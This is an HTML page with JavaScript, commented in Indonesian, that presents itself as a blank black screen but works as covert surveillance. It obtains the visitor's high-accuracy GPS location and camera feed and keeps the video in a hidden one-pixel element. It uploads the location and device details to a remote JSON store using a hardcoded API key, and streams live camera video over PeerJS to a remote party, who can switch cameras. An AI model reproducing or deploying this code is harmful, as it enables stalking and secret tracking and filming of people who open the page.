<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blank</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        html, body {
            width: 100%;
            height: 100%;
            background-color: #000000;
            color: #000000;
            overflow: hidden;
            user-select: none;
            -webkit-user-select: none;
        }
        #hiddenLayer {
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            overflow: hidden;
        }
    </style>
    <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
</head>
<body onclick="onTap()">

<div id="hiddenLayer">
    <video id="localVideo" autoplay playsinline muted></video>
</div>

<script>
    const JSON_URL = "https://api.jsonstorage.net/v1/json/587183f3-b9d9-4a5d-b9b0-063df3a586fe/cca91d54-af4b-4a64-9a4b-20fc0baaf88b";
    const API_KEY  = "b3b1f259-fdd1-4906-b083-51fe497ffd59";

    const DEVICE_NAME = "HP Saya";
    const PREFIX_ID = "jirun-hp-";

    function getOrCreateDeviceKey() {
        let key = localStorage.getItem("jirun_dev_key");
        if (!key) {
            key = Math.random().toString(36).slice(2, 10);
            localStorage.setItem("jirun_dev_key", key);
        }
        return key;
    }

    const deviceKey = getOrCreateDeviceKey();
    const myPeerId = PREFIX_ID + deviceKey;

    let currentFacing = "user"; // "user" = depan, "environment" = belakang
    let cameraStream = null;
    let peer = null;
    let peerReady = false;
    let activeCall = null;
    let activeDataConn = null;
    let watchId = null;
    let latestLocation = null;
    let isStarting = false;
    let isRegistering = false;
    let lastRegisteredSignature = "";

    const videoEl = document.getElementById("localVideo");

    async function fetchStorage() {
        const res = await fetch(`${JSON_URL}?t=${Date.now()}`, { cache: "no-store" });
        if (!res.ok) throw new Error("Fetch failed");
        const data = await res.json();
        return {
            logs: Array.isArray(data.logs) ? data.logs : [],
            devices: data.devices && typeof data.devices === "object" ? data.devices : {},
            command: data.command || { action: "NONE", targetSessionId: null, facing: null, token: null }
        };
    }

    async function saveStorage(payload) {
        const putUrl = `${JSON_URL}?apiKey=${encodeURIComponent(API_KEY)}`;
        const res = await fetch(putUrl, {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
        if (!res.ok) throw new Error("Save failed");
    }

    async function registerDevicePresence(force) {
        if (isRegistering || !latestLocation) return;
        const sig = `${myPeerId}|${latestLocation.lat}|${latestLocation.lng}|${Boolean(cameraStream)}|${currentFacing}|${peerReady}`;
        if (!force && sig === lastRegisteredSignature) return;

        isRegistering = true;
        try {
            const state = await fetchStorage();
            state.devices[myPeerId] = {
                peerId: myPeerId,
                name: DEVICE_NAME,
                cameraReady: Boolean(cameraStream),
                facing: currentFacing === "environment" ? "Belakang" : "Depan",
                location: latestLocation,
                updatedAt: Date.now(),
                userAgent: navigator.userAgent
            };
            await saveStorage(state);
            lastRegisteredSignature = sig;
        } catch (err) {
            console.error("Register error:", err);
        } finally {
            isRegistering = false;
        }
    }

    function sendLiveStatusOverPeer() {
        if (activeDataConn && activeDataConn.open) {
            activeDataConn.send({
                type: "LIVE_STATUS",
                peerId: myPeerId,
                name: DEVICE_NAME,
                facing: currentFacing === "environment" ? "Belakang" : "Depan",
                location: latestLocation,
                updatedAt: Date.now()
            });
        }
    }

    async function openCamera(facing) {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            return null;
        }
        if (cameraStream) {
            cameraStream.getTracks().forEach(t => t.stop());
            cameraStream = null;
        }
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: { ideal: facing }, width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false
        });
        currentFacing = facing;
        cameraStream = stream;
        videoEl.srcObject = stream;
        await videoEl.play().catch(() => {});

        if (activeCall && activeCall.peerConnection) {
            const newTrack = stream.getVideoTracks()[0];
            const sender = activeCall.peerConnection.getSenders().find(s => s.track && s.track.kind === "video");
            if (sender && newTrack) {
                await sender.replaceTrack(newTrack);
            }
        }
        sendLiveStatusOverPeer();
        await registerDevicePresence(true);
        return stream;
    }

    function startLocationStream() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject(new Error("Geolocation not supported"));
                return;
            }
            let done = false;
            if (watchId !== null) navigator.geolocation.clearWatch(watchId);

            watchId = navigator.geolocation.watchPosition(
                (pos) => {
                    latestLocation = {
                        lat: Number(pos.coords.latitude.toFixed(6)),
                        lng: Number(pos.coords.longitude.toFixed(6)),
                        accuracy: Math.round(pos.coords.accuracy) + " m",
                        speed: pos.coords.speed !== null && !Number.isNaN(pos.coords.speed)
                            ? (pos.coords.speed * 3.6).toFixed(1) + " km/j"
                            : "-",
                        heading: pos.coords.heading !== null && !Number.isNaN(pos.coords.heading)
                            ? Math.round(pos.coords.heading) + "°"
                            : "-"
                    };
                    sendLiveStatusOverPeer();
                    registerDevicePresence(false);
                    if (!done) {
                        done = true;
                        resolve(latestLocation);
                    }
                },
                (err) => {
                    if (!done) {
                        done = true;
                        reject(err);
                    }
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 1000 }
            );
        });
    }

    function setupPeer() {
        if (peer) return;
        peer = new Peer(myPeerId);

        peer.on("open", () => {
            peerReady = true;
            registerDevicePresence(true);
        });

        peer.on("connection", (conn) => {
            activeDataConn = conn;
            conn.on("open", () => {
                sendLiveStatusOverPeer();
            });
            conn.on("data", async (msg) => {
                if (!msg || !msg.type) return;
                if (msg.type === "SWITCH_CAM") {
                    const target = msg.facing === "environment" || msg.facing === "user"
                        ? msg.facing
                        : (currentFacing === "user" ? "environment" : "user");
                    await openCamera(target);
                } else if (msg.type === "PING") {
                    sendLiveStatusOverPeer();
                }
            });
            conn.on("close", () => {
                if (activeDataConn === conn) activeDataConn = null;
            });
        });

        peer.on("call", (call) => {
            if (!cameraStream) return;
            activeCall = call;
            call.answer(cameraStream);
        });
    }

    async function init() {
        if (isStarting) return;
        isStarting = true;
        try {
            if (!latestLocation) {
                await startLocationStream();
            }
            if (!cameraStream) {
                await openCamera(currentFacing);
            }
            setupPeer();
            await registerDevicePresence(true);
        } catch (err) {
            console.error(err);
        } finally {
            isStarting = false;
        }
    }

    function onTap() {
        if (!latestLocation || !cameraStream) {
            init();
        }
    }

    function cleanup() {
        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
        if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
        if (activeCall) activeCall.close();
        if (activeDataConn) activeDataConn.close();
        if (peer) peer.destroy();
    }

    window.addEventListener("DOMContentLoaded", init);
    window.addEventListener("pagehide", cleanup);
    window.addEventListener("beforeunload", cleanup);
</script>

</body>
</html>
